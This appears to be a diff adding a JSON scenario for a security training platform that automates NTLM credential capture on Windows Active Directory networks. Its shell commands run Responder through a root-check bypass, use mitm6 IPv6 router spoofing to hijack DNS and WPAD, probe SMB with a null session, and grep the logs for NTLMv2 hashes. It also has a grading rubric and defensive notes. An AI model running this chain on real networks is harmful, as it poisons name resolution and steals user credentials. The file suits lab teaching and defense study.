@@ -1,0 +1,100 @@
+{
+  "id": "ntlm_mitm6_responder",
+  "name": "NTLM Credential Capture via IPv6 DNS Hijacking (mitm6 + Responder)",
+  "description": "无凭据 NTLM 凭据捕获。通过 mitm6 IPv6 路由器通告欺骗将攻击机设为靶机 DNS 服务器，Responder 毒化 WPAD 和 DNS 响应，诱导靶机通过 HTTP/SMB 向攻击机发送 NTLMv2 认证。演示 T1557.002 (WPAD 劫持) 与 T1557.001 (LLMNR/NBT-NS 投毒) 及 T1040 凭据捕获技术。",
+  "category": "credential-access",
+  "difficulty": "advanced",
+  "estimatedDuration": "5-10 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Credential Access",
+    "Collection",
+    "Command and Control"
+  ],
+  "mitreTechniques": [
+    "T1557.001",
+    "T1557.002",
+    "T1040",
+    "T1110.002"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "steps": [
+    {
+      "id": "step1_listen_and_trigger",
+      "name": "Start Listeners + Trigger Target Activity",
+      "description": "Phase 0: 清理残留进程 → Python euid hack 后台拉起 Responder (DNS/SMB/HTTP)。Phase 1: 若 {{ad_domain}} 已设置且 mitm6 已安装，后台启动 mitm6 IPv6 RA 欺骗。Phase 2: netexec 空会话碰一下靶机 SMB 增加网络活动。Phase 3: 等待 35s 让 mitm6+Responder 捕获 WPAD/DNS 请求。Phase 4: 清理后台进程。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "pkill -f '[R]esponder|mitm6' 2>/dev/null; sleep 1; mkdir -p /tmp/responder-noroot/logs; python3 -u -c 'import os; os.geteuid=lambda:0; exec(open(\"/opt/Responder/Responder.py\").read())' -I eth0 -v -F > /tmp/responder-noroot/logs/responder_bg.log 2>&1 & RPID=$!; sleep 5; echo \"Responder PID: $RPID\"; AD_DOMAIN=\"{{ad_domain}}\"; if [ -n \"$AD_DOMAIN\" ] && command -v mitm6 >/dev/null 2>&1; then mitm6 -i eth0 -d \"$AD_DOMAIN\" > /tmp/responder-noroot/logs/mitm6.log 2>&1 & MPID=$!; echo \"mitm6 started (PID $MPID) domain=$AD_DOMAIN\"; sleep 5; elif [ -z \"$AD_DOMAIN\" ]; then echo \"WARNING: AD domain not set (env HEXSTRIKE_WIN_DOMAIN), mitm6 skipped\"; else echo \"WARNING: mitm6 not installed (pip install mitm6), skipped\"; fi; echo \"=== SMB Null Session Probe ===\"; timeout 15 netexec smb {{host}} -u '' -p '' --shares 2>&1 || echo \"Null session probe done\"; echo \"=== Waiting 35s for WPAD/DNS triggers ===\"; sleep 35; echo \"=== Wait complete, checking logs ===\"; kill $RPID 2>/dev/null; wait $RPID 2>/dev/null; kill $MPID 2>/dev/null; wait $MPID 2>/dev/null; echo \"All phases completed\""
+      ],
+      "score": 20,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1557.001",
+        "T1557.002"
+      ],
+      "educationalNote": "双守护进程 + 目标刺激 + 等待捕获 一体化流程。Responder 通过 Python os.geteuid hack 绕过 root 检查绑定 445/80 等端口，提供 DNS 毒化 + SMB/HTTP 认证服务器。mitm6 通过伪造 ICMPv6 Router Advertisement 报文将攻击机设为靶机的 IPv6 DNS 服务器（需要 root 或 CAP_NET_RAW capability）。空会话 SMB 探针增加网络活动，可能触发靶机的 DNS 反向查询。35s 等待窗口为靶机的 WPAD 周期查询和 DNS 解析提供捕获时机。注意：靶机必须未禁用 IPv6，且与攻击机在同一广播域。防御措施：禁用 IPv6（若非必需）、禁用 WPAD（组策略）、启用 SMB 签名。",
+      "requires_teacher_review": true
+    },
+    {
+      "id": "step2_check_logs",
+      "name": "Check for Captured NTLMv2 Hashes",
+      "description": "检查 Responder 日志，查找捕获到的 NTLMv2 或 HTTP-NTLM 哈希证据。若 mitm6 未安装、靶机未开启 IPv6 或不在同一广播域，日志可能为空。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo '=== Responder Logs ===' && ls /tmp/responder-noroot/logs/ 2>/dev/null && echo '=== NTLMv2 / HTTP-NTLM Hashes ===' && (grep -a 'NTLMv2\\|HTTP-NTLMv2\\|WPAD' /tmp/responder-noroot/logs/*.txt 2>/dev/null || echo 'No hashes captured (check: mitm6 installed? IPv6 enabled on target? same broadcast domain?)')"
+      ],
+      "score": 20,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1040"
+      ],
+      "educationalNote": "Responder 捕获结果分别记录在 SMB-NTLMv2-SSP-*.txt (SMB 认证哈希)、HTTP-NTLMv2-*.txt (HTTP NTLM 认证哈希)、DNS-Poisoned-*.txt (DNS 毒化记录) 等日志文件中。WPAD 触发通常产生 HTTP-NTLMv2 日志条目。若日志为空，检查：(1) mitm6 是否以 root 运行？(2) HEXSTRIKE_WIN_DOMAIN 是否设置为正确的 AD 域名？(3) 攻击机与靶机是否在同一广播域？(4) 靶机是否开启了 IPv6？防御措施：禁用 IPv6，禁用 WPAD，启用 SMB 签名，迁移到 Kerberos。"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "listeners_and_trigger",
+        "desc": "成功启动监听器并完成目标活动刺激",
+        "points": 20,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Responder|mitm6|Null|probe|Wait"
+        }
+      },
+      {
+        "id": "ntlm_hash_captured",
+        "desc": "在日志中发现捕获的 NTLMv2 或 HTTP-NTLM 哈希",
+        "points": 20,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "NTLMv2|HTTP-NTLMv2|WPAD|hash"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "may_be_empty_if_no_match",
+  "emptyOutputExplanation": "mitm6 + Responder 链路需要：(1) mitm6 已安装并以 root 运行 (pip install mitm6)；(2) HEXSTRIKE_WIN_DOMAIN 已设置为目标 AD 域名；(3) 攻击机与靶机在同一 IPv6 link-local 广播域；(4) 靶机未禁用 IPv6；(5) 防火墙未拦截 ICMPv6 RA。教学沙箱环境若不满足条件，NTLMv2 哈希可能无法捕获。",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示无凭据 NTLM 捕获链：mitm6 IPv6 RA 欺骗劫持 DNS → Responder DNS 毒化 + WPAD 劫持 → 靶机 HTTP/SMB 认证 → 截获 NTLMv2 哈希。展示 IPv6 攻击面的协议层欺骗技术。",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
